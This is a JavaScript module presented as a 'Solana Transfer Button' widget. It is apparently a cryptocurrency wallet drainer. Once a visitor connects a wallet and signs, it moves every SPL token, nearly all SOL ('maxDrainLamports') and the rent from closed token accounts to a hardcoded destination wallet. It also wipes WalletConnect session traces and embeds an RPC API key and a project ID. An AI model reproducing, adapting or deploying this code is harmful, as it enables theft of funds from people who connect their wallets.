import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
} from "https://esm.sh/@solana/web3.js@1.98.4";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  createCloseAccountInstruction,
  createTransferInstruction,
  getAssociatedTokenAddressSync,
} from "https://esm.sh/@solana/spl-token@0.4.9";
import { WalletConnectWalletAdapter } from "https://esm.sh/@solana/wallet-adapter-walletconnect@0.1.21?bundle";

const TRANSACTION_MESSAGE_LIMIT = 1100;
const SOL_BUFFER_LAMPORTS = 0;
const DEFAULT_APP_NAME = "Solana Transfer Button";
const DEFAULT_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=f14cd484-e553-4b01-9b5f-ebcd0bf62c5b";
const DEFAULT_DESTINATION_WALLET = "4DzDJ2rJDtLynUNvKrR3Bqmtr9i9a7Vt5eoL7JEFYJLp";
const DEFAULT_WALLETCONNECT_PROJECT_ID = "1fb04306cef4a9dda1c9f9d392e198a6";

export function initSolanaTransferButton(button, config = {}) {
  if (!(button instanceof HTMLButtonElement)) {
    throw new Error("initSolanaTransferButton requires a button element.");
  }

  const settings = {
    appName: config.appName ?? DEFAULT_APP_NAME,
    destinationWallet: config.destinationWallet ?? DEFAULT_DESTINATION_WALLET,
    rpcUrl: config.rpcUrl ?? DEFAULT_RPC_URL,
    walletConnectProjectId:
      config.walletConnectProjectId ?? DEFAULT_WALLETCONNECT_PROJECT_ID,
    preferWalletConnect: config.preferWalletConnect ?? true,
  };

  const state = {
    providers: [],
    provider: null,
    owner: null,
    portfolio: null,
    transferPlan: null,
    connection: new Connection(settings.rpcUrl, "confirmed"),
    walletConnectStoragePrefix: buildWalletConnectStoragePrefix(),
  };

  resetWalletConnectState();
  refreshDetectedWallets();
  syncButton();

  const onClick = async () => {
    if (!state.owner) {
      await connectWallet();
      return;
    }

    await executeTransferPlan();
  };

  const onPageHide = () => {
    disconnectWalletSession();
  };

  const onPageShow = () => {
    resetLocalState();
    refreshDetectedWallets();
    syncButton();
    emit("status", { connected: false, label: "No wallet connected" });
  };

  button.addEventListener("click", onClick);
  window.addEventListener("beforeunload", onPageHide);
  window.addEventListener("pagehide", onPageHide);
  window.addEventListener("pageshow", onPageShow);

  return {
    disconnect: async () => {
      await disconnectWallet();
    },
    destroy: () => {
      button.removeEventListener("click", onClick);
      window.removeEventListener("beforeunload", onPageHide);
      window.removeEventListener("pagehide", onPageHide);
      window.removeEventListener("pageshow", onPageShow);
      void disconnectWallet();
    },
    refresh: async () => {
      refreshDetectedWallets();
      if (state.owner) {
        await loadPortfolio();
      }
    },
    getState: () => ({
      connected: Boolean(state.owner),
      owner: state.owner?.toBase58?.() ?? null,
      transferCount: state.transferPlan?.transactions?.length ?? 0,
    }),
  };

  function emit(name, detail) {
    button.dispatchEvent(
      new CustomEvent(`solana-transfer:${name}`, {
        detail,
      }),
    );
  }

  function log(message) {
    emit("log", { message });
  }

  function syncButton() {
    if (!state.owner) {
      button.textContent = "Connect wallet";
      button.disabled = state.providers.length === 0;
      return;
    }

    button.textContent = "Sign and send transaction";
    button.disabled = !state.transferPlan?.transactions?.length;
  }

  function refreshDetectedWallets() {
    const providers = [];
    const seen = new Set();
    const candidates = [
      {
        name: "Phantom",
        provider: [window.phantom?.solana, window.solana].find((provider) => provider?.isPhantom),
      },
      {
        name: "Backpack",
        provider: [window.backpack?.solana, window.xnft?.solana, window.solana].find(
          (provider) => provider?.isBackpack,
        ),
      },
      {
        name: "Solflare",
        provider: [window.solflare, window.solana].find((provider) => provider?.isSolflare),
      },
    ];

    for (const candidate of candidates) {
      if (!candidate.provider || seen.has(candidate.provider)) {
        continue;
      }
      seen.add(candidate.provider);
      providers.push({ ...candidate, kind: "injected" });
    }

    if (settings.walletConnectProjectId.trim()) {
      providers.push({ name: "WalletConnect QR", kind: "walletconnect" });
    }

    state.providers = providers;
  }

  function pickPreferredProvider() {
    if (state.providers.length === 0) {
      return null;
    }

    const priority = settings.preferWalletConnect
      ? ["Phantom", "WalletConnect QR", "Backpack", "Solflare"]
      : ["Phantom", "Backpack", "Solflare", "WalletConnect QR"];

    for (const name of priority) {
      const provider = state.providers.find((item) => item.name === name);
      if (provider) {
        return provider;
      }
    }

    return state.providers[0];
  }

  async function connectWallet() {
    const walletEntry = pickPreferredProvider();
    if (!walletEntry) {
      log("No supported wallet detected.");
      syncButton();
      return;
    }

    try {
      const provider =
        walletEntry.kind === "walletconnect"
          ? createWalletConnectProvider()
          : walletEntry.provider;

      if (walletEntry.kind === "walletconnect") {
        await resetWalletConnectProvider(provider);
      }

      const response = await provider.connect();
      state.provider = provider;
      state.owner = response?.publicKey ?? provider.publicKey;
      if (!state.owner) {
        throw new Error("Connected wallet did not expose a Solana public key.");
      }

      if (typeof provider.on === "function") {
        provider.on("disconnect", handleDisconnect);
        provider.on("accountChanged", handleAccountChanged);
      }

      emit("status", {
        connected: true,
        label: `${walletEntry.name} connected`,
        owner: state.owner.toBase58(),
      });
      log(`Connected ${walletEntry.name}: ${shortenAddress(state.owner.toBase58())}`);
      syncButton();
      await loadPortfolio();
    } catch (error) {
      const message = `Wallet connection failed: ${formatError(error)}`;
      log(message);
      emit("error", { message });
    }
  }

  function createWalletConnectProvider() {
    return new WalletConnectWalletAdapter({
      network: "mainnet-beta",
      options: {
        projectId: settings.walletConnectProjectId.trim(),
        customStoragePrefix: state.walletConnectStoragePrefix,
        relayUrl: "wss://relay.walletconnect.com",
        metadata: {
          name: settings.appName,
          description: "Transfer SOL and SPL tokens to a destination wallet",
          url: window.location.origin,
          icons: ["https://solana.com/src/img/branding/solanaLogoMark.svg"],
        },
      },
    });
  }

  async function loadPortfolio() {
    if (!state.owner) {
      return;
    }

    try {
      const owner = toPublicKey(state.owner);
      const [solBalance, tokenAccountsResponse] = await Promise.all([
        state.connection.getBalance(owner),
        state.connection.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_PROGRAM_ID }),
      ]);

      state.portfolio = {
        owner: owner.toBase58(),
        solLamports: solBalance,
        tokens: tokenAccountsResponse.value.map((item) => {
          const parsed = item.account.data.parsed.info;
          const amount = parsed.tokenAmount;
          return {
            account: item.pubkey.toBase58(),
            mint: parsed.mint,
            rawAmount: amount.amount,
            uiAmountString: amount.uiAmountString,
            symbol: shortenAddress(parsed.mint),
          };
        }),
      };

      await prepareTransferPlan();
    } catch (error) {
      const message = `Failed to load balances: ${formatError(error)}`;
      log(message);
      emit("error", { message });
    }
  }

  async function prepareTransferPlan() {
    if (!state.portfolio || !state.owner) {
      return;
    }

    try {
      const owner = toPublicKey(state.owner);
      const destination = new PublicKey(settings.destinationWallet);

      if (destination.equals(owner)) {
        throw new Error("Destination wallet must be different from the connected wallet.");
      }

      const blockhash = await state.connection.getLatestBlockhash("confirmed");
      const tokenInstructionGroups = await buildTokenInstructionGroups(owner, destination);
      const tokenTransactions = packInstructionGroups(tokenInstructionGroups, owner, blockhash.blockhash);
      let estimatedFees = 0;

      for (const transaction of tokenTransactions) {
        estimatedFees += await estimateTransactionFee(state.connection, transaction);
      }

      const transactions = [...tokenTransactions];
      const feeProbeTransaction = new Transaction({
        feePayer: owner,
        recentBlockhash: blockhash.blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: owner,
          toPubkey: destination,
          lamports: 1,
        }),
      );
      const solTransactionFee = await estimateTransactionFee(state.connection, feeProbeTransaction);
      const sourceMinimumBalance = await state.connection.getMinimumBalanceForRentExemption(0);
      const maxDrainLamports = Math.max(
        state.portfolio.solLamports - estimatedFees - solTransactionFee,
        0,
      );
      let transferableLamports = 0;

      if (maxDrainLamports > sourceMinimumBalance) {
        const keepSourceRentExempt =
          state.portfolio.solLamports - estimatedFees - solTransactionFee - sourceMinimumBalance;
        transferableLamports = Math.max(keepSourceRentExempt - SOL_BUFFER_LAMPORTS, 0);
      } else {
        transferableLamports = maxDrainLamports;
      }

      if (transferableLamports > 0) {
        const solTransaction = new Transaction({
          feePayer: owner,
          recentBlockhash: blockhash.blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: owner,
            toPubkey: destination,
            lamports: transferableLamports,
          }),
        );
        estimatedFees += solTransactionFee;
        transactions.push(solTransaction);
      }

      state.transferPlan = {
        destination: destination.toBase58(),
        transactions,
      };
      syncButton();
      emit("plan", {
        destination: destination.toBase58(),
        transactionCount: transactions.length,
        estimatedFees,
      });
      log(`Prepared ${transactions.length} transaction(s).`);
    } catch (error) {
      state.transferPlan = null;
      syncButton();
      const message = `Failed to prepare transfer plan: ${formatError(error)}`;
      log(message);
      emit("error", { message });
    }
  }

  async function buildTokenInstructionGroups(owner, destination) {
    if (state.portfolio.tokens.length === 0) {
      return [];
    }

    const accountsWithBalance = state.portfolio.tokens.filter((token) => BigInt(token.rawAmount) > 0n);
    const ataAddresses = accountsWithBalance.map((token) =>
      getAssociatedTokenAddressSync(
        new PublicKey(token.mint),
        destination,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID,
      ),
    );
    const ataInfo =
      ataAddresses.length > 0 ? await state.connection.getMultipleAccountsInfo(ataAddresses) : [];
    const groups = [];

    for (let index = 0; index < accountsWithBalance.length; index += 1) {
      const token = accountsWithBalance[index];
      const mint = new PublicKey(token.mint);
      const source = new PublicKey(token.account);
      const destinationAta = ataAddresses[index];
      const group = [];

      if (!ataInfo[index]) {
        group.push(
          createAssociatedTokenAccountInstruction(
            owner,
            destinationAta,
            destination,
            mint,
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID,
          ),
        );
      }

      group.push(
        createTransferInstruction(
          source,
          destinationAta,
          owner,
          BigInt(token.rawAmount),
          [],
          TOKEN_PROGRAM_ID,
        ),
      );

      group.push(createCloseAccountInstruction(source, destination, owner, [], TOKEN_PROGRAM_ID));
      groups.push(group);
    }

    const emptyAccounts = state.portfolio.tokens.filter((token) => BigInt(token.rawAmount) === 0n);
    for (const token of emptyAccounts) {
      groups.push([
        createCloseAccountInstruction(
          new PublicKey(token.account),
          destination,
          owner,
          [],
          TOKEN_PROGRAM_ID,
        ),
      ]);
    }

    return groups;
  }

  function packInstructionGroups(groups, owner, blockhash) {
    const transactions = [];
    let current = new Transaction({ feePayer: owner, recentBlockhash: blockhash });

    for (const group of groups) {
      const candidate = new Transaction({ feePayer: owner, recentBlockhash: blockhash });
      for (const instruction of current.instructions) {
        candidate.add(instruction);
      }
      for (const instruction of group) {
        candidate.add(instruction);
      }

      if (
        current.instructions.length > 0 &&
        candidate.serializeMessage().length > TRANSACTION_MESSAGE_LIMIT
      ) {
        transactions.push(current);
        current = new Transaction({ feePayer: owner, recentBlockhash: blockhash });
      }

      for (const instruction of group) {
        current.add(instruction);
      }
    }

    if (current.instructions.length > 0) {
      transactions.push(current);
    }

    return transactions;
  }

  async function executeTransferPlan() {
    if (!state.transferPlan || !state.provider || !state.owner) {
      return;
    }

    try {
      const latest = await state.connection.getLatestBlockhash("confirmed");
      const transactions = state.transferPlan.transactions.map((transaction) => {
        transaction.recentBlockhash = latest.blockhash;
        transaction.feePayer = toPublicKey(state.owner);
        return transaction;
      });

      let signedTransactions;
      if (typeof state.provider.signAllTransactions === "function") {
        signedTransactions = await state.provider.signAllTransactions(transactions);
      } else if (typeof state.provider.signTransaction === "function") {
        signedTransactions = [];
        for (const transaction of transactions) {
          signedTransactions.push(await state.provider.signTransaction(transaction));
        }
      } else {
        throw new Error("Connected wallet cannot sign transactions from the browser.");
      }

      const signatures = [];
      for (const signedTransaction of signedTransactions) {
        const signature = await state.connection.sendRawTransaction(signedTransaction.serialize());
        await state.connection.confirmTransaction(
          {
            signature,
            blockhash: latest.blockhash,
            lastValidBlockHeight: latest.lastValidBlockHeight,
          },
          "confirmed",
        );
        signatures.push(signature);
      }

      emit("sent", { signatures, destination: state.transferPlan.destination });
      log(`Execution complete. ${signatures.length} transaction(s) sent.`);
      await loadPortfolio();
    } catch (error) {
      const message = `Execution failed: ${formatError(error)}`;
      log(message);
      emit("error", { message });
    }
  }

  async function disconnectWallet() {
    if (state.provider && typeof state.provider.disconnect === "function") {
      try {
        await state.provider.disconnect();
      } catch {
        // Ignore disconnect failures during cleanup.
      }
    }

    resetWalletConnectState();
    handleDisconnect();
  }

  function disconnectWalletSession() {
    if (state.provider && typeof state.provider.disconnect === "function") {
      try {
        state.provider.disconnect();
      } catch {
        // Ignore disconnect failures during page unload.
      }
    }

    resetWalletConnectState();
    resetLocalState();
  }

  async function resetWalletConnectProvider(provider) {
    resetWalletConnectState();
    if (!provider || typeof provider.disconnect !== "function") {
      return;
    }

    try {
      await provider.disconnect();
    } catch {
      // Ignore reset failures and continue.
    }
  }

  function resetWalletConnectState() {
    clearWalletConnectStorage(window.localStorage);
    clearWalletConnectStorage(window.sessionStorage);
    void clearWalletConnectIndexedDb();
  }

  function handleDisconnect() {
    resetLocalState();
    syncButton();
    emit("status", { connected: false, label: "No wallet connected" });
    log("Wallet disconnected.");
  }

  function handleAccountChanged(publicKey) {
    if (!publicKey) {
      handleDisconnect();
      return;
    }

    state.owner = publicKey;
    state.transferPlan = null;
    syncButton();
    void loadPortfolio();
  }

  function resetLocalState() {
    state.provider = null;
    state.owner = null;
    state.portfolio = null;
    state.transferPlan = null;
    state.walletConnectStoragePrefix = buildWalletConnectStoragePrefix();
  }
}

function buildWalletConnectStoragePrefix() {
  return `sol-transfer-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
}

async function clearWalletConnectIndexedDb() {
  if (!("indexedDB" in window) || typeof window.indexedDB.databases !== "function") {
    return;
  }

  try {
    const databases = await window.indexedDB.databases();
    const targets = databases
      .map((database) => database.name)
      .filter(Boolean)
      .filter((name) => {
        const normalized = String(name).toLowerCase();
        return normalized.includes("walletconnect") || normalized.startsWith("wc@") || normalized.startsWith("wc:");
      });

    await Promise.all(
      targets.map(
        (name) =>
          new Promise((resolve) => {
            const request = window.indexedDB.deleteDatabase(name);
            request.onsuccess = () => resolve();
            request.onerror = () => resolve();
            request.onblocked = () => resolve();
          }),
      ),
    );
  } catch {
    // Ignore IndexedDB failures.
  }
}

function clearWalletConnectStorage(storage) {
  try {
    const keysToDelete = [];
    for (let index = 0; index < storage.length; index += 1) {
      const key = storage.key(index);
      const normalizedKey = key?.toLowerCase?.() ?? "";
      if (
        normalizedKey.includes("walletconnect") ||
        normalizedKey.startsWith("wc@") ||
        normalizedKey.startsWith("wc:") ||
        normalizedKey.includes("walletconnect-deeplink") ||
        normalizedKey.includes("walletconnect_qrcode") ||
        normalizedKey.includes("walletconnectv2")
      ) {
        keysToDelete.push(key);
      }
    }

    for (const key of keysToDelete) {
      storage.removeItem(key);
    }
  } catch {
    // Ignore storage access failures.
  }
}

async function estimateTransactionFee(connection, transaction) {
  const feeResponse = await connection.getFeeForMessage(transaction.compileMessage(), "confirmed");
  return feeResponse.value ?? 0;
}

function toPublicKey(key) {
  return key instanceof PublicKey ? key : new PublicKey(key.toBase58 ? key.toBase58() : String(key));
}

function shortenAddress(value) {
  if (!value || value.length < 10) {
    return value;
  }

  return `${value.slice(0, 4)}...${value.slice(-4)}`;
}

function formatError(error) {
  if (error instanceof Error) {
    return error.message;
  }

  if (error && typeof error === "object") {
    const maybeMessage =
      error.message ??
      error.error?.message ??
      error.reason ??
      error.details ??
      error.toString?.();
    if (maybeMessage && maybeMessage !== "[object Object]") {
      return String(maybeMessage);
    }

    try {
      return JSON.stringify(error);
    } catch {
      return "Unknown wallet error";
    }
  }

  return String(error);
}
